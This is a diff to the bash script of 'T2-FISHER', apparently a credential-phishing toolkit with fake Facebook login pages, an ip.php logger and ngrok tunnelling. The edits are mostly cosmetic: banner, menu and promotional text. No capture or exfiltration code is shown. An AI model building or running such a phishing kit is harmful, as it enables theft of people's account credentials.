@@ -11,11 +11,6 @@ sleep 2
 echo ""
 echo  $green"                   THANKS FOR USING MY TOOL " |lolcat
 echo ""
-echo  $green"                BYE BYE! TAKE CARE COME AGAIN! " |lolcat
-echo ""
-sleep 1
-echo  $green"              YOURS (TECHNOCYBER & HACKERSPUNK) " |lolcat
-echo ""
 exit 1
 }
 
@@ -103,9 +98,11 @@ clear
 figlet T2-FISHER  | lolcat
 
 echo " "
-echo -e $'\e[1;37m\e[0m\e[1;37m  <<+-+-+-+-+-+-+-+-+-+-+-+ WANT TO LEARN HACKING ? +-+-+-+-+-+-+-+-+-+-+-+ >>\e[0m'|lolcat
-echo -e " ••••••••••••••••••••• VISIT OUR WEBSITE FOR MORE INFORMATION •••••••••••••••••••••"
-echo -e " ××××××××××××××××××××× www.technocyber.tk ×××××××××××××××××××××"
+echo -e $'\e[1;37m\e[0m\e[1;37m  <<+-+-+-+-+-+-+-+-+-+ WANT TO LEARN HACKING ? +-+-+-+-+-+-+-+-+-+ >>\e[0m'|lolcat
+echo " "
+echo -e " <×••••••••••••••• VISIT OUR WEBSITE FOR MORE INFORMATION ••••••••••••••••×>"|lolcat
+echo " "
+echo -e " ××××××××××××××××××××××× www.technocyber.tk ××××××××××××××××××××××"|lolcat
 echo " "
 
 }
@@ -236,6 +233,7 @@ fi
 
 }
 
+clear
 facebook(){
 echo  "  _____________________________________________________________" | lolcat
 printf "          \e[1;31m[\e[0m\e[1;77m01\e[0m\e[1;31m]\e[0m\e[0m\e[96m Traditional Login Page\e[0m\n"
@@ -418,14 +416,14 @@ cp -f .Modules/ip.php .htr/www/
 def_tunnel_menu="2"
 smallbanner
 echo -e " =*=*==*=*=*=*=*=*=*=*=*=*=* SELECT A PORT FORWARDING OPTION =*=*=*=*=*=*=*=*=*=*=*=*=*"
-echo -e "\e[96m                          T2-FISHER PORT FORWARDING\e[96m"
+echo -e "\e[96m                        T2-FISHER PORT FORWARDING\e[96m"
 echo -e "\e[96m                        ╔═══════════════════════╗\e[0m"
-echo -e "\e[91m                        ║\e[93m FOR LOCAL HOST       \e[91m ║\e[0m"                                                             
+echo -e "\e[91m                        ║\e[93m    FOR LOCAL HOST    \e[91m ║\e[0m"                                                             
 echo -e "\e[91m                        ║        \e[93mType\e[92m 01\e[91m        ║\e[0m"
 echo -e "\e[96m                        ║                       ║\e[91m"                                                                         
 echo -e "\e[96m                        ║         (Or)          ║\e[96m"
 echo -e "\e[96m                        ║                       ║\e[96m"
-echo -e "\e[91m                        ║ \e[93m FOR NGROK           \e[91m ║\e[0m"              
+echo -e "\e[91m                        ║ \e[93m     FOR NGROK       \e[91m ║\e[0m"              
 echo -e "\e[91m                        ║        \e[93mType\e[92m 02\e[91m        ║\e[0m"
 echo -e "\e[96m                        ║                       ║"
 echo -e "\e[96m                        ╚═══════════════════════╝"
